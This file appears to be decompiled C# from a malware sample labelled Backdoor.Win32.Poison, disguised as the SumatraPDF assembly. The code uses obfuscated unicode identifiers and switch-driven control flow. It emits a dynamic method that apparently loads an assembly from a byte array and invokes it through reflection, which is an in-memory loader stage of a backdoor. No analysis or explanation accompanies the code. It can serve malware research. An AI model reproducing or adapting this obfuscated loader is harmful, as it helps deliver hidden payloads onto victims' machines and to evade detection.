// Decompiled with JetBrains decompiler
// Type: 嵃멒瓅驉섅큿ศ驎
// Assembly: SumatraPDF, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 735CCAFF-475B-4E3F-81A7-1B168C2B944C
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Backdoor.Win32.Poison.hjzu-0c71efd90e5a7373f095f742a538e03c8fe06bd10bd9d4340b3520a8ba14ffa3.exe

using System;
using System.Reflection;
using System.Reflection.Emit;

public class 嵃멒瓅驉섅큿ศ驎
{
  public bool 쿬麠\uE6FFឲ\uFFFD沶\u0C73뎷;
  public ኸ㿸\uFFFD\u2F74\uE4FF懍ㅨ잍 뉤ꅓ췌떍㻥\u28F8翞䎹;

  public 嵃멒瓅驉섅큿ศ驎()
  {
label_0:
    // ISSUE: explicit constructor call
    base.\u002Ector();
    this.뉤ꅓ췌떍㻥\u28F8翞䎹 = (ኸ㿸\uFFFD\u2F74\uE4FF懍ㅨ잍) null;
    switch (1)
    {
      case 0:
        goto label_0;
    }
  }

  ~嵃멒瓅驉섅큿ศ驎()
  {
label_0:
    try
    {
      this.쿬麠\uE6FFឲ\uFFFD沶\u0C73뎷 = false;
      switch (1)
      {
        case 0:
          goto label_0;
        default:
          this.뉤ꅓ췌떍㻥\u28F8翞䎹 = (ኸ㿸\uFFFD\u2F74\uE4FF懍ㅨ잍) null;
          break;
      }
    }
    finally
    {
      // ISSUE: explicit finalizer call
      base.Finalize();
    }
  }

  public void ⴗ\u2E32\u2F91耍\u288A碹崿ୡ()
  {
label_0:
    this.뉤ꅓ췌떍㻥\u28F8翞䎹 = new ኸ㿸\uFFFD\u2F74\uE4FF懍ㅨ잍();
    int num = 3;
    while (true)
    {
      switch (num)
      {
        case 0:
          goto label_0;
        case 2:
          this.뉤ꅓ췌떍㻥\u28F8翞䎹.蓆졳㚪\uE3F6\u27DE\u171F\u0B77棃 = 嵃멒瓅驉섅큿ศ驎.ጓ瓇ᐫ뛼\u3399늧㣤䆁<Delegate>(typeof (ኸ㿸\uFFFD\u2F74\uE4FF懍ㅨ잍.SendToPDF));
          this.쿬麠\uE6FFឲ\uFFFD沶\u0C73뎷 = true;
          num = 1;
          continue;
        case 3:
          this.쿬麠\uE6FFឲ\uFFFD沶\u0C73뎷 = false;
          num = 2;
          continue;
        default:
          goto label_2;
      }
    }
label_2:
    throw new τ磵ῒ悴萇酳\u4DC3\u327C((object) this.뉤ꅓ췌떍㻥\u28F8翞䎹.蓆졳㚪\uE3F6\u27DE\u171F\u0B77棃);
  }

  public static T ጓ瓇ᐫ뛼\u3399늧㣤䆁<T>(Type _param0)
  {
label_0:
    DynamicMethod dynamicMethod = new DynamicMethod("clrv2.2", typeof (void), new Type[1]
    {
      typeof (byte[])
    }, true);
    ILGenerator ilGenerator = dynamicMethod.GetILGenerator();
    int num = 12;
    MethodInfo meth;
    while (true)
    {
      switch (num)
      {
        case 0:
          goto label_0;
        case 2:
          ilGenerator.Emit(OpCodes.Ldc_I4_0);
          ilGenerator.Emit(OpCodes.Newarr, typeof (object));
          嵃멒瓅驉섅큿ศ驎.\uE81A帰獳曯\uE0BE\u328Fퟹ\uE16E<MethodBase>(13, out meth);
          num = 11;
          continue;
        case 3:
          ilGenerator.Emit(OpCodes.Ldc_I4_0);
          num = 4;
          continue;
        case 4:
          ilGenerator.Emit(OpCodes.Ldelem_Ref);
          嵃멒瓅驉섅큿ศ驎.\uE81A帰獳曯\uE0BE\u328Fퟹ\uE16E<Type>(50, out meth);
          num = 7;
          continue;
        case 5:
          ilGenerator.Emit(OpCodes.Ldnull);
          num = 2;
          continue;
        case 6:
          ilGenerator.Emit(OpCodes.Ret);
          num = 9;
          continue;
        case 7:
          ilGenerator.Emit(OpCodes.Callvirt, meth);
          num = 8;
          continue;
        case 8:
          ilGenerator.Emit(OpCodes.Ldc_I4_0);
          ilGenerator.Emit(OpCodes.Ldelem_Ref);
          num = 5;
          continue;
        case 9:
          goto label_10;
        case 10:
          ilGenerator.Emit(OpCodes.Call, meth);
          嵃멒瓅驉섅큿ศ驎.\uE81A帰獳曯\uE0BE\u328Fퟹ\uE16E<Assembly>(16, out meth);
          ilGenerator.Emit(OpCodes.Callvirt, meth);
          num = 3;
          continue;
        case 11:
          ilGenerator.Emit(OpCodes.Callvirt, meth);
          ilGenerator.Emit(OpCodes.Pop);
          num = 6;
          continue;
        case 12:
          ilGenerator.Emit(OpCodes.Ldarg_0);
          meth = (MethodInfo) null;
          num = 1;
          continue;
        default:
          嵃멒瓅驉섅큿ศ驎.\uE81A帰獳曯\uE0BE\u328Fퟹ\uE16E<Assembly>(39, out meth);
          num = 10;
          continue;
      }
    }
label_10:
    return (T) dynamicMethod.CreateDelegate(_param0);
  }

  private static void \uE81A帰獳曯\uE0BE\u328Fퟹ\uE16E<T>(int _param0, out MethodInfo _param1)
  {
label_0:
    _param1 = typeof (T).GetMethods()[_param0];
    switch (1)
    {
      case 0:
        goto label_0;
    }
  }
}
